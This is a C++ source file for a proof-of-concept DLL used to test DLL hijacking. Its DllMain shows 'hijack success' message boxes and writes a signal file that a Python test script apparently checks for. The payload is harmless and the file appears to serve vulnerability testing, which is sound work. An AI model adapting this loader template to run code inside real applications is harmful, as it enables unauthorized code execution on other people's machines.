#include <windows.h>
#include <fstream>      // For creating the signal file
#include <string>
#include <filesystem>   // For path manipulation (C++17)

// The signal file your Python script looks for
const char* SIGNAL_FILENAME = "payload_executed_signal.txt";

// Function that the vulnerable app might try to call
extern "C" __declspec(dllexport) void SayHello() {
    MessageBoxA(NULL, "Hello from the DLL HIJACKING SayHello function!", "Hijacked DLL", MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        {
            MessageBoxA(NULL, "Hijacked DLL (NonExistentLib.dll) has been loaded!", "DLL Hijack Success", MB_OK | MB_ICONEXCLAMATION);

            // Create the signal file
            try {
                wchar_t path[MAX_PATH];
                if (GetModuleFileNameW(hModule, path, MAX_PATH) != 0) {
                    std::filesystem::path dllPath = path;
                    std::filesystem::path dirPath = dllPath.parent_path();
                    std::filesystem::path signalFilePath = dirPath / SIGNAL_FILENAME;

                    std::ofstream signalFile(signalFilePath.string()); // Use .string() for older compilers if path object not directly accepted
                    if (signalFile.is_open()) {
                        signalFile << "Payload DLL (NonExistentLib.dll) executed successfully at " << GetTickCount() << std::endl;
                        signalFile.close();
                    }
                }
            } catch (const std::exception& e) {
                // Handle error creating signal file, e.g., by showing another MessageBox
                std::string errorMsg = "Hijacked DLL: Error creating signal file - ";
                errorMsg += e.what();
                MessageBoxA(NULL, errorMsg.c_str() , "Signal File Error", MB_OK | MB_ICONERROR);
            } catch (...) {
                MessageBoxA(NULL, "Hijacked DLL: Unknown error creating signal file.", "Signal File Error", MB_OK | MB_ICONERROR);
            }
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        // Optional: Cleanup signal file if needed, though Python script might do it.
        // For testing, it might be better to leave the signal file for inspection.
        break;
    }
    return TRUE;
}